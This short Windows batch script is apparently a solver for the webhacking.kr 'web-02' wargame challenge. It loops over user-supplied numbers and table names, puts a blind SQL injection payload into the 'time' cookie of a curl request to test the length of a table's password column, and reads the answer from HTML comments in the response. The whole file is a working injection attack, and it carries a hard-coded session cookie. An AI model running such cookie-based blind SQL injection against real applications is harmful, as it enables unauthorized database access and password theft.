@echo off
:LOOP
set /p str="input num: "
set /p str2="input table name: "

curl http://webhacking.kr/challenge/web/web-02/ --cookie "PHPSESSID=fca36526f085fed53e76dd2f2fa77703;time=1543201000 and (select length(password) from %str2%)=%str%" > httpfile.txt

findstr "<!--.*-->" httpfile.txt
goto LOOP
pause